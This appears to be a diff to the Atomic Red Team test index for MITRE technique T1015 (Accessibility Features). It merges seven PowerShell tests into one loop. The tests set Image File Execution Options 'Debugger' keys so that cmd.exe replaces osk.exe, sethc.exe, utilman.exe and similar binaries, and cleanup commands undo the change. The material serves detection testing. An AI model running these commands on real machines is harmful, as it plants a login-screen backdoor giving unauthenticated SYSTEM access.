@@ -166,228 +166,35 @@ persistence:
       modified: '2019-07-16T19:07:04.652Z'
       identifier: T1015
     atomic_tests:
-    - name: Attaches Command Prompt As Debugger To Process - osk
-      description: 'This allows adversaries to execute the attached process
-
-'
+    - name: Attaches Command Prompt as a Debugger to a List of Target Processes
+      description: |
+        This allows adversaries to execute the attached process
+        Attaches cmd.exe to osk.exe by default. Other useful values to include in parent_list include: "sethc.exe", "utilman.exe", "magnify.exe", "narrator.exe", "DisplaySwitch.exe", "atbroker.exe".
       supported_platforms:
       - windows
       input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
+        parent_list:
+          description: Comma separated list of system binaries to which you want to
+            attach each
           type: String
           default: osk.exe
+        attached_process:
+          description: Full path to process to attach to target in
+          type: Path
+          default: C:\windows\system32\cmd.exe
       executor:
         name: powershell
         elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - sethc
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: sethc.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - utilman
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: utilman.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger
-          /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - magnify
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: magnify.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger
-          /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - narrator
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: narrator.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\narrator.exe" /v Debugger
-          /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - DisplaySwitch
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: DisplaySwitch.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger
-          /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - AtBroker
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: atbroker.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force | Out-Null
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v Debugger
-          /f
-
-'
+        command: "$input_table = #{parent_list}\nForeach ($item in $input_table){
+          \  \n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image
+          File Execution Options\\$item\"\n  $Value = \"#{attached_process}\"\n  $Name
+          = \"Debugger\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path
+          $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name
+          -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty
+          -Path $registryPath -Name $name -Value $Value\n  }\n}\n"
+        cleanup_command: "$input_table = #{parent_list}  \nForeach ($item in $input_table){\n
+          \ reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image
+          File Execution Options\\$item\" /v Debugger /f\n}\n"
   T1098:
     technique:
       x_mitre_permissions_required:
@@ -12807,228 +12614,35 @@ privilege-escalation:
       modified: '2019-07-16T19:07:04.652Z'
       identifier: T1015
     atomic_tests:
-    - name: Attaches Command Prompt As Debugger To Process - osk
-      description: 'This allows adversaries to execute the attached process
-
-'
+    - name: Attaches Command Prompt as a Debugger to a List of Target Processes
+      description: |
+        This allows adversaries to execute the attached process
+        Attaches cmd.exe to osk.exe by default. Other useful values to include in parent_list include: "sethc.exe", "utilman.exe", "magnify.exe", "narrator.exe", "DisplaySwitch.exe", "atbroker.exe".
       supported_platforms:
       - windows
       input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
+        parent_list:
+          description: Comma separated list of system binaries to which you want to
+            attach each
           type: String
           default: osk.exe
+        attached_process:
+          description: Full path to process to attach to target in
+          type: Path
+          default: C:\windows\system32\cmd.exe
       executor:
         name: powershell
         elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - sethc
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: sethc.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - utilman
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: utilman.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger
-          /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - magnify
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: magnify.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger
-          /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - narrator
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: narrator.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\narrator.exe" /v Debugger
-          /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - DisplaySwitch
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: DisplaySwitch.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger
-          /f
-
-'
-    - name: Attaches Command Prompt As Debugger To Process - AtBroker
-      description: 'This allows adversaries to execute the attached process
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        target_executable:
-          description: File You Want To Attach cmd To
-          type: String
-          default: atbroker.exe
-      executor:
-        name: powershell
-        elevation_required: true
-        command: |
-          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe"
-          $Value = "C:\windows\system32\cmd.exe"
-          $Name = "Debugger"
-          IF(!(Test-Path $registryPath))
-           {
-            New-Item -Path $registryPath -Force | Out-Null
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
-           }
-          ELSE
-           {
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value
-           }
-        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v Debugger
-          /f
-
-'
+        command: "$input_table = #{parent_list}\nForeach ($item in $input_table){
+          \  \n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image
+          File Execution Options\\$item\"\n  $Value = \"#{attached_process}\"\n  $Name
+          = \"Debugger\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path
+          $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name
+          -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty
+          -Path $registryPath -Name $name -Value $Value\n  }\n}\n"
+        cleanup_command: "$input_table = #{parent_list}  \nForeach ($item in $input_table){\n
+          \ reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image
+          File Execution Options\\$item\" /v Debugger /f\n}\n"
   '':
     technique:
       x_mitre_data_sources:
